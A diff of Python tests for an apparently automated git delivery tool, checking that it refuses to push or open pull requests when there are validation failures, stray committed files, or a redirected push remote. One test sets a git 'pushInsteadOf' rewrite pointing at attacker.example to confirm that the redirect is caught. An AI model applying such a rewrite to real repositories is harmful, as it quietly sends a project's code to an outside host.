@@ -121,7 +121,9 @@ def test_validation_failure_stops_before_push_or_pr(tmp_path: Path) -> None:
     )
     harness.git("add", "justfile")
     harness.git("commit", "-qm", "configure failing checks")
-    completion = harness.deliver(delivery_context())
+    context = delivery_context()
+    context["files"].append("justfile")
+    completion = harness.deliver(context)
     assert completion.returncode != 0
     assert harness.git("branch", "--show-current") != "main"
     assert not harness.state().get("prs")
@@ -136,6 +138,38 @@ def test_unrelated_staged_changes_are_rejected_before_branch_creation(tmp_path: 
     assert completion.returncode != 0
     assert harness.git("branch", "--show-current") == "main"
     assert harness.git("diff", "--cached", "--name-only") == "unrelated.txt"
+    assert not harness.state().get("issues")
+
+
+def test_unselected_committed_branch_files_are_rejected_before_branch_creation(
+    tmp_path: Path,
+) -> None:
+    harness = make_harness(tmp_path)
+    (harness.root / "unselected.txt").write_text("committed outside context", encoding="utf-8")
+    harness.git("add", "unselected.txt")
+    harness.git("commit", "-qm", "unselected branch change")
+
+    completion = harness.deliver(delivery_context())
+
+    assert completion.returncode != 0
+    assert "unselected.txt" in completion.stderr
+    assert harness.git("branch", "--show-current") == "main"
+    assert not harness.state().get("issues")
+
+
+def test_push_instead_of_rewrite_to_another_repository_is_rejected(tmp_path: Path) -> None:
+    harness = make_harness(tmp_path)
+    harness.git(
+        "config",
+        "url.https://attacker.example/other-project.pushInsteadOf",
+        harness.remote.as_uri(),
+    )
+
+    completion = harness.deliver(delivery_context())
+
+    assert completion.returncode != 0
+    assert "Push remote differs" in completion.stderr
+    assert harness.git("branch", "--show-current") == "main"
     assert not harness.state().get("issues")
 
 
